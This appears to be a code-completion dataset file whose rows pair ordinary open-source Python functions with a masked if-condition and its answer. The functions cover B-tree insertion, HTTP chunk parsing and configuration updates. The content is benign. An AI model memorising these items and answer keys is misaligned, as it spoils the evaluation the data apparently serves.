3224,"def get_sources(urls, trusted_hosts):<tab>trusted_hosts = [<tab><tab>six.moves.urllib.parse.urlparse(url).netloc for url in trusted_hosts<tab>]<tab>sources = []<tab>for url in urls:<tab><tab>parsed_url = six.moves.urllib.parse.urlparse(url)<tab><tab>netloc = parsed_url.netloc<tab><tab>if ""@"" in netloc:<tab><tab><tab>_, _, netloc = netloc.rpartition(""@"")<tab><tab>name, _, _ = netloc.partition(<tab><tab><tab>"".""<tab><tab>)  # Just use the domain name as the source name<tab><tab>verify_ssl = True<tab><tab><IF-STMT><tab><tab><tab>verify_ssl = False<tab><tab>sources.append({""url"": url, ""name"": name, ""verify_ssl"": verify_ssl})<tab>return sources",if netloc in trusted_hosts :,196
3225,"def _insert_to_nonfull_node(self, node: Node, key):<tab>i = len(node.keys) - 1<tab>while i >= 0 and node.keys[i] >= key:  # find position where insert key<tab><tab>i -= 1<tab>if node.is_leaf:<tab><tab>node.keys.insert(i + 1, key)<tab>else:<tab><tab>if len(node.children[i + 1].keys) >= self.max_number_of_keys:  # overflow<tab><tab><tab>self._split_child(node, i + 1)<tab><tab><tab><IF-STMT>  # decide which child is going to have a new key<tab><tab><tab><tab>i += 1<tab><tab>self._insert_to_nonfull_node(node.children[i + 1], key)",if node . keys [ i + 1 ] < key :,195
3226,"def _variable_state(self, char, index):<tab>self._variable_chars.append(char)<tab>if char == ""}"" and not self._is_escaped(self._string, index):<tab><tab>self._open_curly -= 1<tab><tab>if self._open_curly == 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise StopIteration<tab><tab><tab>self._state = self._waiting_item_state<tab>elif char in self._identifiers:<tab><tab>self._state = self._internal_variable_start_state",if not self . _can_have_item ( ) :,131
3227,def __next__(self):<tab>if self.index > 0:<tab><tab><IF-STMT><tab><tab><tab>raise StopIteration<tab><tab>if len(self.saved) > self.index:<tab><tab><tab>obj = self.saved[self.index]<tab><tab><tab>self.index += 1<tab><tab>else:<tab><tab><tab>obj = self.saved[0]<tab><tab><tab>self.index = 1<tab>else:<tab><tab>try:<tab><tab><tab>obj = next(self.iterable)<tab><tab>except StopIteration:<tab><tab><tab>if not self.saved:<tab><tab><tab><tab>raise<tab><tab><tab>obj = self.saved[0]<tab><tab><tab>self.index = 1<tab><tab>else:<tab><tab><tab>self.saved.append(obj)<tab>return obj,if not self . saved :,180
3228,"def get_host_info(self, host):<tab>""""""Return hostvars for a single host""""""<tab>if host in self.inventory[""_meta""][""hostvars""]:<tab><tab>return self.inventory[""_meta""][""hostvars""][host]<tab>elif self.args.host and self.inventory[""_meta""][""hostvars""]:<tab><tab>match = None<tab><tab>for k, v in self.inventory[""_meta""][""hostvars""].items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>match = k<tab><tab><tab><tab>break<tab><tab>if match:<tab><tab><tab>return self.inventory[""_meta""][""hostvars""][match]<tab><tab>else:<tab><tab><tab>raise VMwareMissingHostException(""%s not found"" % host)<tab>else:<tab><tab>raise VMwareMissingHostException(""%s not found"" % host)","if self . inventory [ ""_meta"" ] [ ""hostvars"" ] [ k ] [ ""name"" ] == self . args . host :",195
3229,def readline(self):<tab>if self.peek is not None:<tab><tab>line = self.peek<tab><tab>self.peek = None<tab>else:<tab><tab>line = self.file.readline()<tab>if not line:<tab><tab>return line<tab>if he.match(line):<tab><tab>return line<tab>while 1:<tab><tab>self.peek = self.file.readline()<tab><tab><IF-STMT><tab><tab><tab>return line<tab><tab>line = line + self.peek<tab><tab>self.peek = None,"if len ( self . peek ) == 0 or ( self . peek [ 0 ] != "" "" and self . peek [ 0 ] != ""\t"" ) :",148
3230,"def testCheckIPGenerator(self):<tab>for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000):<tab><tab>if i == 254:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.0.255"")<tab><tab>elif i == 255:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.1.0"")<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(str(ip), ""127.0.3.233"")<tab><tab>elif i == 65534:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.255.255"")<tab><tab>elif i == 65535:<tab><tab><tab>self.assertEqual(str(ip), ""127.1.0.0"")",elif i == 1000 :,181
3231,"def __new__(cls, a=1, b=0.5):  # Singleton:<tab>if cls._instances:<tab><tab>cls._instances[:] = [instance for instance in cls._instances if instance()]<tab><tab>for instance in cls._instances:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return instance()<tab>o = super(Prior, cls).__new__(cls, a, b)<tab>cls._instances.append(weakref.ref(o))<tab>return cls._instances[-1]()",if instance ( ) . a == a and instance ( ) . b == b :,123
3232,"def forward(self, x):<tab>if self.is_nan:<tab><tab><IF-STMT><tab><tab><tab>return torch.isnan(x).float()<tab><tab>else:<tab><tab><tab>return torch.isnan(torch.index_select(x, 1, self.column_indices)).float()<tab>else:<tab><tab>if self.features == ""all"":<tab><tab><tab>return torch.eq(x, self.missing_values).float()<tab><tab>else:<tab><tab><tab>return torch.eq(<tab><tab><tab><tab>torch.index_select(x, 1, self.column_indices), self.missing_values<tab><tab><tab>).float()","if self . features == ""all"" :",154
3233,"def __mro_entries__(self, bases):<tab>if self._name:  # generic version of an ABC or built-in class<tab><tab>return super().__mro_entries__(bases)<tab>if self.__origin__ is Generic:<tab><tab>if Protocol in bases:<tab><tab><tab>return ()<tab><tab>i = bases.index(self)<tab><tab>for b in bases[i + 1 :]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ()<tab>return (self.__origin__,)","if isinstance ( b , _BaseGenericAlias ) and b is not self :",124
3234,"def _set_frequency(self, value):<tab>if not self._pwm and value is not None:<tab><tab>self._connection.set_PWM_frequency(self._number, value)<tab><tab>self._connection.set_PWM_range(self._number, 10000)<tab><tab>self._connection.set_PWM_dutycycle(self._number, 0)<tab><tab>self._pwm = True<tab>elif self._pwm and value is not None:<tab><tab><IF-STMT><tab><tab><tab>self._connection.set_PWM_frequency(self._number, value)<tab><tab><tab>self._connection.set_PWM_range(self._number, 10000)<tab>elif self._pwm and value is None:<tab><tab>self._connection.write(self._number, 0)<tab><tab>self._pwm = False",if value != self . _connection . get_PWM_frequency ( self . _number ) :,196
3235,"def literal(self):<tab>if self.peek('""'):<tab><tab>lit, lang, dtype = self.eat(r_literal).groups()<tab><tab><IF-STMT><tab><tab><tab>lang = lang<tab><tab>else:<tab><tab><tab>lang = None<tab><tab>if dtype:<tab><tab><tab>dtype = dtype<tab><tab>else:<tab><tab><tab>dtype = None<tab><tab>if lang and dtype:<tab><tab><tab>raise ParseError(""Can't have both a language and a datatype"")<tab><tab>lit = unquote(lit)<tab><tab>return Literal(lit, lang, dtype)<tab>return False",if lang :,132
3236,"def _staged_model_references(self, load_relationships=False):<tab>for name, field in self._fields.items():<tab><tab>if isinstance(field, BaseRelationship):<tab><tab><tab>try:<tab><tab><tab><tab>if load_relationships:<tab><tab><tab><tab><tab>value = getattr(self, name)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>value = self.data_store.get(name, (""staged"", ""committed""))<tab><tab><tab>except (AttributeError, KeyError, PathResolutionError):<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if not isinstance(value, ModelCollection):<tab><tab><tab><tab>value = [value]<tab><tab><tab>for related in value:<tab><tab><tab><tab>related_name = field.related_name<tab><tab><tab><tab>yield related, related_name",if value is None :,198
3237,"def __call__(self, target):<tab># normal running mode<tab>if not self.check_run_always:<tab><tab>for algo in self.algos:<tab><tab><tab>if not algo(target):<tab><tab><tab><tab>return False<tab><tab>return True<tab># run mode when at least one algo has a run_always attribute<tab>else:<tab><tab># store result in res<tab><tab># allows continuation to check for and run<tab><tab># algos that have run_always set to True<tab><tab>res = True<tab><tab>for algo in self.algos:<tab><tab><tab>if res:<tab><tab><tab><tab>res = algo(target)<tab><tab><tab>elif hasattr(algo, ""run_always""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>algo(target)<tab><tab>return res",if algo . run_always :,188
3238,"def addRow(self, row):<tab>r = []<tab>for j in range(self.numColumn):<tab><tab>w, s = calWidth(row[j], self.maxWidth)<tab><tab><IF-STMT><tab><tab><tab>self.W[j] = w<tab><tab>r.append((w, s))<tab>self.M.append(r)",if w > self . W [ j ] :,90
3239,"def parse(s):<tab>text, anns = """", []<tab># tweak text: remove space around annotations and strip space<tab>s = re.sub(r""(<category[^<>]*>)( +)"", r""\2\1"", s)<tab>s = re.sub(r""( +)(<\/category>)"", r""\2\1"", s)<tab>rest = s.strip()<tab>while True:<tab><tab>m = re.match(r'^(.*?)<category=""([^""]+)"">(.*?)</category>(.*)$', rest)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>pre, type_, tagged, rest = m.groups()<tab><tab>text += pre<tab><tab>anns.append((len(text), len(text) + len(tagged), type_, tagged))<tab><tab>text += tagged<tab>text += rest<tab>return text, anns",if not m :,196
3240,"def _generate_examples(self, filepath):<tab>with open(filepath) as f:<tab><tab>line_num = -1<tab><tab>while True:<tab><tab><tab>line_num += 1<tab><tab><tab>sentence = f.readline().strip()<tab><tab><tab>pronoun = f.readline().strip()<tab><tab><tab>candidates = [c.strip() for c in f.readline().strip().split("","")]<tab><tab><tab>correct = f.readline().strip()<tab><tab><tab>f.readline()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>yield line_num, {<tab><tab><tab><tab>""sentence"": sentence,<tab><tab><tab><tab>""pronoun"": pronoun,<tab><tab><tab><tab>""candidates"": candidates,<tab><tab><tab><tab>""label"": candidates.index(correct),<tab><tab><tab>}",if not sentence :,189
3241,"def format_unencoded(self, tokensource, outfile):<tab><IF-STMT><tab><tab>self._write_lineno(outfile)<tab>for ttype, value in tokensource:<tab><tab>color = self._get_color(ttype)<tab><tab>for line in value.splitlines(True):<tab><tab><tab>if color:<tab><tab><tab><tab>outfile.write(""<%s>%s</>"" % (color, line.rstrip(""\n"")))<tab><tab><tab>else:<tab><tab><tab><tab>outfile.write(line.rstrip(""\n""))<tab><tab><tab>if line.endswith(""\n""):<tab><tab><tab><tab>if self.linenos:<tab><tab><tab><tab><tab>self._write_lineno(outfile)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>outfile.write(""\n"")<tab>if self.linenos:<tab><tab>outfile.write(""\n"")",if self . linenos :,190
3242,"def refresh_pool_in_list(pool_list, conn, uuid):<tab>for row in pool_list.get_model():<tab><tab><IF-STMT><tab><tab><tab># Update active sensitivity and percent available for passed uuid<tab><tab><tab>row[3] = get_pool_size_percent(conn, uuid)<tab><tab><tab>row[2] = conn.get_pool(uuid).is_active()<tab><tab><tab>return",if row [ 0 ] == uuid :,103
3243,"def save_claims_for_resolve(self, claim_infos):<tab>to_save = {}<tab>for info in claim_infos:<tab><tab><IF-STMT><tab><tab><tab>if info[""value""]:<tab><tab><tab><tab>to_save[info[""claim_id""]] = info<tab><tab>else:<tab><tab><tab>for key in (""certificate"", ""claim""):<tab><tab><tab><tab>if info.get(key, {}).get(""value""):<tab><tab><tab><tab><tab>to_save[info[key][""claim_id""]] = info[key]<tab>return self.save_claims(to_save.values())","if ""value"" in info :",141
3244,"def rx(self, text):<tab>r = []<tab>for c in text:<tab><tab><IF-STMT><tab><tab><tab>r.append(c)<tab><tab>elif c < "" "":<tab><tab><tab>r.append(unichr(0x2400 + ord(c)))<tab><tab>else:<tab><tab><tab>r.extend(unichr(0x2080 + ord(d) - 48) for d in ""{:d}"".format(ord(c)))<tab><tab><tab>r.append("" "")<tab>return """".join(r)","if "" "" <= c < ""\x7f"" or c in ""\r\n\b\t"" :",139
3245,"def consume_bytes(data):<tab>state_machine.receive_data(data)<tab>while True:<tab><tab>event = state_machine.next_event()<tab><tab>if event is h11.NEED_DATA:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab># Ignore 1xx responses<tab><tab><tab>continue<tab><tab>elif isinstance(event, h11.Response):<tab><tab><tab># We have our response! Save it and get out of here.<tab><tab><tab>context[""h11_response""] = event<tab><tab><tab>raise LoopAbort<tab><tab>else:<tab><tab><tab># Can't happen<tab><tab><tab>raise RuntimeError(""Unexpected h11 event {}"".format(event))","elif isinstance ( event , h11 . InformationalResponse ) :",166
3246,"def validate_text(dialect, attr):<tab>val = getattr(dialect, attr)<tab>if not isinstance(val, text_type):<tab><tab><IF-STMT><tab><tab><tab>raise Error('""{0}"" must be string, not bytes'.format(attr))<tab><tab>raise Error('""{0}"" must be string, not {1}'.format(attr, type(val).__name__))<tab>if len(val) != 1:<tab><tab>raise Error('""{0}"" must be a 1-character string'.format(attr))",if type ( val ) == bytes :,122
3247,"def _refresh(self):<tab>self.uiProfileSelectComboBox.clear()<tab>self.uiProfileSelectComboBox.addItem(""default"")<tab>try:<tab><tab>if os.path.exists(self.profiles_path):<tab><tab><tab>for profile in sorted(os.listdir(self.profiles_path)):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.uiProfileSelectComboBox.addItem(profile)<tab>except OSError:<tab><tab>pass","if not profile . startswith ( ""."" ) :",107
3248,"def get_entry(self, ip):<tab>self.parse()<tab>options = []<tab>for (line_type, components) in self._contents:<tab><tab>if line_type == ""option"":<tab><tab><tab>(pieces, _tail) = components<tab><tab><tab><IF-STMT><tab><tab><tab><tab>options.append(pieces[1:])<tab>return options",if len ( pieces ) and pieces [ 0 ] == ip :,93
3249,"def __new__(mcls, cls_name, bases, d):<tab>offset = 0<tab>for base in bases:<tab><tab>for realbase in base.__mro__:<tab><tab><tab>offset += len(realbase.__dict__.get(""_methods_"", []))<tab>for i, args in enumerate(d.get(""_methods_"", [])):<tab><tab>name = args[0]<tab><tab>restype = args[1]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>argtypes = args[2:]<tab><tab>m = COMMethod(name, offset + i, restype, argtypes)<tab><tab>d[name] = m<tab>return type(ctypes.c_void_p).__new__(mcls, cls_name, bases, dict(d))",if restype is None :,170
3250,"def _compare_caffe_tvm(caffe_out, tvm_out, is_network=False):<tab>for i in range(len(caffe_out)):<tab><tab><IF-STMT><tab><tab><tab>caffe_out[i] = caffe_out[i][:1]<tab><tab>tvm.testing.assert_allclose(caffe_out[i], tvm_out[i], rtol=1e-5, atol=1e-5)",if is_network :,116
3251,"def update_transcoder(self):<tab>self.save_button.set_visible(False)<tab>if self.cast and self.fn:<tab><tab>self.transcoder = Transcoder(<tab><tab><tab>self.cast,<tab><tab><tab>self.fn,<tab><tab><tab>lambda did_transcode=None: GLib.idle_add(self.update_status, did_transcode),<tab><tab><tab>self.transcoder,<tab><tab>)<tab><tab>if self.autoplay:<tab><tab><tab>self.autoplay = False<tab><tab><tab>self.play_clicked(None)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.transcoder.destroy()<tab><tab><tab>self.transcoder = None<tab>GLib.idle_add(self.update_media_button_states)",if self . transcoder :,186
3252,"def deserialize(x):<tab>t = type(x)<tab>if t is list:<tab><tab>return list(imap(deserialize, x))<tab>if t is dict:<tab><tab>if ""_id_"" not in x:<tab><tab><tab>return {key: deserialize(val) for key, val in iteritems(x)}<tab><tab>obj = objmap.get(x[""_id_""])<tab><tab><IF-STMT><tab><tab><tab>entity_name = x[""class""]<tab><tab><tab>entity = database.entities[entity_name]<tab><tab><tab>pk = x[""_pk_""]<tab><tab><tab>obj = entity[pk]<tab><tab>return obj<tab>return x",if obj is None :,150
3253,"def release(self, conn, error=False):<tab>if not conn.is_closed:<tab><tab><IF-STMT><tab><tab><tab>self.connections.append(conn)<tab><tab>else:<tab><tab><tab>self.close_callable(conn)",if not error and len ( self . connections ) < self . pool_size :,71
3254,"def install_symlinks(self):<tab>""""""Create symlinks for some applications files.""""""<tab>if self.has_symlinks():<tab><tab>for app_path in self.app_path:<tab><tab><tab>for symlink in self.symlinks.values():<tab><tab><tab><tab>root = symlink[""root""]<tab><tab><tab><tab>dest = path.join(str(app_path), symlink[""dest""])<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.backup.create(dest)<tab><tab><tab><tab><tab>symlink_file(root, dest)",if path . exists ( dest ) :,126
3255,def _fill_array():<tab>global _array<tab>for i in range(624):<tab><tab>y = (_array[i] & _bitmask2) + (_array[(i + 1) % 624] & _bitmask3)<tab><tab>_array[i] = _array[(i + 397) % 624] ^ (y >> 1)<tab><tab><IF-STMT><tab><tab><tab>_array[i] ^= 2567483615,if y % 2 != 0 :,107
3256,"def parseLeftHandSideExpressionAllowCall():<tab>marker = None<tab>expr = None<tab>args = None<tab>property = None<tab>marker = createLocationMarker()<tab>expr = parseNewExpression() if matchKeyword(""new"") else parsePrimaryExpression()<tab>while (match(""."") or match(""["")) or match(""(""):<tab><tab>if match(""(""):<tab><tab><tab>args = parseArguments()<tab><tab><tab>expr = delegate.createCallExpression(expr, args)<tab><tab>elif match(""[""):<tab><tab><tab>property = parseComputedMember()<tab><tab><tab>expr = delegate.createMemberExpression(""["", expr, property)<tab><tab>else:<tab><tab><tab>property = parseNonComputedMember()<tab><tab><tab>expr = delegate.createMemberExpression(""."", expr, property)<tab><tab><IF-STMT><tab><tab><tab>marker.end()<tab><tab><tab>marker.apply(expr)<tab>return expr",if marker :,193
3257,"def unregister_zombies(self):<tab>""""""Unregister zombie builds (those whose builddir is gone).""""""<tab>from pprint import pprint<tab>pprint(self.configs)<tab>for build_num, config in self.configs.items():<tab><tab>obj_dir_path = join(<tab><tab><tab>config.buildDir,<tab><tab><tab>_srcTreeName_from_config(config),<tab><tab><tab>""mozilla"",<tab><tab><tab>config.mozObjDir,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.unregister(build_num, ""zombie (`%s' does not exist)"" % obj_dir_path)",if not exists ( obj_dir_path ) :,152
3258,"def isUpdateAvailable(self, localOnly=False):<tab>nsp = self.getLatestFile()<tab>if not nsp:<tab><tab>if not nsp:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab>try:<tab><tab>latest = self.lastestVersion(localOnly=localOnly)<tab><tab>if latest is None:<tab><tab><tab>return False<tab><tab>if int(nsp.version) < int(latest):<tab><tab><tab>return True<tab>except BaseException as e:<tab><tab>Print.error(""isUpdateAvailable exception %s: %s"" % (self.id, str(e)))<tab><tab>pass<tab>return False",if not self . isUpdate or ( self . version and int ( self . version ) > 0 ) :,179
3259,"def verify_settings(rst_path: Path) -> Iterator[Error]:<tab>for setting_name, default in find_settings_in_rst(rst_path):<tab><tab>actual = getattr(app.conf, setting_name)<tab><tab><IF-STMT><tab><tab><tab>default = default.total_seconds()<tab><tab>if isinstance(actual, Enum):<tab><tab><tab>actual = actual.value<tab><tab>if actual != default:<tab><tab><tab>yield Error(<tab><tab><tab><tab>reason=""mismatch"",<tab><tab><tab><tab>setting=setting_name,<tab><tab><tab><tab>default=default,<tab><tab><tab><tab>actual=actual,<tab><tab><tab>)","if isinstance ( default , timedelta ) :",152
3260,"def config_update(self, *updates):<tab>filename = os.path.join(self.path, "".git"", ""config"")<tab>with GitConfigParser(file_or_files=filename, read_only=False) as config:<tab><tab>for section, key, value in updates:<tab><tab><tab>try:<tab><tab><tab><tab>old = config.get(section, key)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>config.remove_option(section, key)<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>if old == value:<tab><tab><tab><tab><tab>continue<tab><tab><tab>except (NoSectionError, NoOptionError):<tab><tab><tab><tab>pass<tab><tab><tab>if value is not None:<tab><tab><tab><tab>config.set_value(section, key, value)",if value is None :,183
3261,"def __init__(self, search_space):<tab>self.params = {}<tab>for key in search_space.keys():<tab><tab><IF-STMT><tab><tab><tab>self.params[key] = Factor(search_space[key][""_value""])<tab><tab>else:<tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""G_BFS Tuner doesn't support this kind of parameter: ""<tab><tab><tab><tab>+ str(search_space[key][""_type""])<tab><tab><tab>)","if search_space [ key ] [ ""_type"" ] == ""factor"" :",125
3262,"def largest_image_url(self):<tab># TODO: remove. it is not responsibility of Scrapper<tab>if not self.imgs and not self.top_img:<tab><tab>return None<tab>if self.top_img:<tab><tab>return self.top_img<tab>max_area = 0<tab>max_url = None<tab>for img_url in self.imgs:<tab><tab>dimension = fetch_image_dimension(img_url, self.useragent, referer=self.url)<tab><tab>area = self.calculate_area(img_url, dimension)<tab><tab><IF-STMT><tab><tab><tab>max_area = area<tab><tab><tab>max_url = img_url<tab>log.debug(""using max img {}"".format(max_url))<tab>return max_url",if area > max_area :,182
3263,"def _geo_indices(cls, inspected=None):<tab>inspected = inspected or []<tab>geo_indices = []<tab>inspected.append(cls)<tab>for field in cls._fields.values():<tab><tab>if hasattr(field, ""document_type""):<tab><tab><tab>field_cls = field.document_type<tab><tab><tab>if field_cls in inspected:<tab><tab><tab><tab>continue<tab><tab><tab>if hasattr(field_cls, ""_geo_indices""):<tab><tab><tab><tab>geo_indices += field_cls._geo_indices(inspected)<tab><tab><IF-STMT><tab><tab><tab>geo_indices.append(field)<tab>return geo_indices",elif field . _geo_index :,155
3264,"def __call__(self, trainer):<tab>self._t += 1<tab>optimizer = self._get_optimizer(trainer)<tab>value = self._init * (self._rate ** self._t)<tab>if self._target is not None:<tab><tab><IF-STMT><tab><tab><tab># almost same as value = min(value, self._target), but this<tab><tab><tab># line supports negative values, too<tab><tab><tab>if value / self._target > 1:<tab><tab><tab><tab>value = self._target<tab><tab>else:<tab><tab><tab># ditto<tab><tab><tab>if value / self._target < 1:<tab><tab><tab><tab>value = self._target<tab>self._update_value(optimizer, value)",if self . _rate > 1 :,167
3265,"def _parse_chunked(self, data):<tab>body = []<tab>trailers = {}<tab>n = 0<tab>lines = data.split(b""\r\n"")<tab># parse body<tab>while True:<tab><tab>size, chunk = lines[n : n + 2]<tab><tab>size = int(size, 16)<tab><tab><IF-STMT><tab><tab><tab>n += 1<tab><tab><tab>break<tab><tab>self.assertEqual(size, len(chunk))<tab><tab>body.append(chunk)<tab><tab>n += 2<tab><tab># we /should/ hit the end chunk, but check against the size of<tab><tab># lines so we're not stuck in an infinite loop should we get<tab><tab># malformed data<tab><tab>if n > len(lines):<tab><tab><tab>break<tab>return b"""".join(body)",if size == 0 :,191
3266,"def _gen_opnds(ii):  # generator<tab># filter out write-mask operands and suppressed operands<tab>for op in ii.parsed_operands:<tab><tab>if op.lookupfn_name in [""MASK1"", ""MASKNOT0""]:<tab><tab><tab>continue<tab><tab>if op.visibility == ""SUPPRESSED"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>yield op","if op . name == ""BCAST"" :",104
3267,"def allow_request(self, request, view):<tab>if settings.API_THROTTLING:<tab><tab>request_allowed = super(GranularUserRateThrottle, self).allow_request(<tab><tab><tab>request, view<tab><tab>)<tab><tab>if not request_allowed:<tab><tab><tab>user = getattr(request, ""user"", None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>log.info(""User %s throttled for scope %s"", request.user, self.scope)<tab><tab><tab><tab>ActivityLog.create(amo.LOG.THROTTLED, self.scope, user=user)<tab><tab>return request_allowed<tab>else:<tab><tab>return True",if user and request . user . is_authenticated :,164
3268,"def _make_callback(self):<tab>callback = self.callback<tab>for plugin in self.all_plugins():<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>callback = plugin.apply(callback, self)<tab><tab><tab>else:<tab><tab><tab><tab>callback = plugin(callback)<tab><tab>except RouteReset:  # Try again with changed configuration.<tab><tab><tab>return self._make_callback()<tab><tab>if not callback is self.callback:<tab><tab><tab>update_wrapper(callback, self.callback)<tab>return callback","if hasattr ( plugin , ""apply"" ) :",131
3269,"def OnDeleteLine(self, items):<tab>for n in items:<tab><tab>if n >= 0:<tab><tab><tab>name1 = self.items[n][2]<tab><tab><tab>name2 = self.items[n][4]<tab><tab><tab>del self.items[n]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.bindiff.matched1.remove(name1)<tab><tab><tab>if name2 in self.bindiff.matched2:<tab><tab><tab><tab>self.bindiff.matched2.remove(name2)<tab>return [Choose.ALL_CHANGED] + items",if name1 in self . bindiff . matched1 :,146
3270,"def on_treeview_buttonrelease(self, widget, event, data=None):<tab>if self.promptToSave():<tab><tab># True result indicates user selected Cancel. Stop event propagation<tab><tab>return True<tab>else:<tab><tab>x = int(event.x)<tab><tab>y = int(event.y)<tab><tab>time = event.time<tab><tab>pthinfo = widget.get_path_at_pos(x, y)<tab><tab>if pthinfo is not None:<tab><tab><tab>path, col, cellx, celly = pthinfo<tab><tab><tab>currentPath, currentCol = widget.get_cursor()<tab><tab><tab>if currentPath != path:<tab><tab><tab><tab>widget.set_cursor(path, col, 0)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.__popupMenu(event)<tab><tab>return False",if event . button == 3 :,198
3271,"def __lt__(self, other):<tab>try:<tab><tab>if self._version != other._version:<tab><tab><tab>return self._version < other._version<tab><tab>if self._ip != other._ip:<tab><tab><tab>return self._ip < other._ip<tab><tab><IF-STMT><tab><tab><tab>return self.netmask < other.netmask<tab><tab>return False<tab>except AttributeError:<tab><tab>return NotImplemented",if self . netmask != other . netmask :,104
3272,"def config_video_apply(self, dev_id_info):<tab>df, da, add_define, hf, ha, add_hotplug = self.make_apply_data()<tab>ignore = add_hotplug<tab>if self.editted(EDIT_VIDEO_MODEL):<tab><tab>model = self.get_combo_label_value(""video-model"")<tab><tab><IF-STMT><tab><tab><tab>add_define(self.vm.define_video_model, dev_id_info, model)<tab>return self._change_config_helper(df, da, hf, ha)",if model :,138
3273,"def write(self, b):<tab>if self._write_watcher is None:<tab><tab>raise UnsupportedOperation(""write"")<tab>while True:<tab><tab>try:<tab><tab><tab>return _write(self._fileno, b)<tab><tab>except (IOError, OSError) as ex:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>wait_on_watcher(self._write_watcher, None, None, self.hub)",if ex . args [ 0 ] not in ignored_errors :,110
3274,"def scan_resource_conf(self, conf):<tab>if ""enabled"" in conf and conf[""enabled""][0]:<tab><tab>retention_block = conf[""retention_policy""][0]<tab><tab>if retention_block[""enabled""][0]:<tab><tab><tab>retention_in_days = force_int(retention_block[""days""][0])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return CheckResult.PASSED<tab>return CheckResult.FAILED",if retention_in_days and retention_in_days >= 90 :,118
3275,"def _find_gist_with_file(user, filename, env):<tab>import requests  # expensive<tab>page = 1<tab>url = ""https://api.github.com/users/%s/gists"" % user<tab>while True:<tab><tab>resp = requests.get(<tab><tab><tab>url,<tab><tab><tab>params={""page"": page, ""per_page"": 100},<tab><tab><tab>headers=_github_auth_headers(env),<tab><tab>)<tab><tab>gists = resp.json()<tab><tab>if not gists:<tab><tab><tab>return None<tab><tab>for gist in gists:<tab><tab><tab>for name in gist[""files""]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return gist<tab><tab>page += 1",if name == filename :,178
3276,"def parse_position_spec(self):<tab>line = self.lookahead()<tab>if line.startswith(""jump="") or line.startswith(""jcnd=""):<tab><tab>self.consume()<tab><tab>return True<tab>mo = self._position_re.match(line)<tab>if not mo:<tab><tab>return False<tab>position, id, name = mo.groups()<tab>if id:<tab><tab>table = self._position_table_map[position]<tab><tab><IF-STMT><tab><tab><tab>self.position_ids[(table, id)] = name<tab><tab>else:<tab><tab><tab>name = self.position_ids.get((table, id), """")<tab>self.positions[self._position_map[position]] = name<tab>self.consume()<tab>return True",if name :,177
3277,"def remove_header(self, header):<tab>new_msg = b""""<tab>old_msg = self.msg_bytes.split(""\n"")<tab>i = 0<tab>while True:<tab><tab>line = old_msg[i]<tab><tab>i += 1<tab><tab><IF-STMT><tab><tab><tab>new_msg += line<tab><tab>if line == """":<tab><tab><tab>break<tab>new_msg += old_msg[i:]<tab>self.msg_bytes = new_msg","if not line . startswith ( b""%s: "" % header ) :",122
3278,"def on_janitor_selection_changed(self, selection):<tab>model, iter = selection.get_selected()<tab>if iter:<tab><tab>if self.janitor_model.iter_has_child(iter):<tab><tab><tab>iter = self.janitor_model.iter_children(iter)<tab><tab>plugin = model[iter][self.JANITOR_PLUGIN]<tab><tab>for row in self.result_model:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.result_view.get_selection().select_path(row.path)<tab><tab><tab><tab>log.debug(""scroll_to_cell: %s"" % row.path)<tab><tab><tab><tab>self.result_view.scroll_to_cell(row.path)",if row [ self . RESULT_PLUGIN ] == plugin :,184
3279,"def record_line(self, frame, event, arg):  # pylint: disable=unused-argument<tab>""""""Records line execution time.""""""<tab>if event == ""line"":<tab><tab><IF-STMT><tab><tab><tab>runtime = time.time() - self.prev_timestamp<tab><tab><tab>self.lines.append([self.prev_path, self.prev_lineno, runtime])<tab><tab>self.prev_lineno = frame.f_lineno<tab><tab>self.prev_path = frame.f_code.co_filename<tab><tab>self.prev_timestamp = time.time()<tab>return self.record_line",if self . prev_timestamp :,142
3280,"def get_outdated_docs(self) -> Iterator[str]:<tab>for docname in self.env.found_docs:<tab><tab>if docname not in self.env.all_docs:<tab><tab><tab>yield docname<tab><tab><tab>continue<tab><tab>targetname = path.join(self.outdir, docname + self.out_suffix)<tab><tab>try:<tab><tab><tab>targetmtime = path.getmtime(targetname)<tab><tab>except Exception:<tab><tab><tab>targetmtime = 0<tab><tab>try:<tab><tab><tab>srcmtime = path.getmtime(self.env.doc2path(docname))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield docname<tab><tab>except OSError:<tab><tab><tab># source doesn't exist anymore<tab><tab><tab>pass",if srcmtime > targetmtime :,176
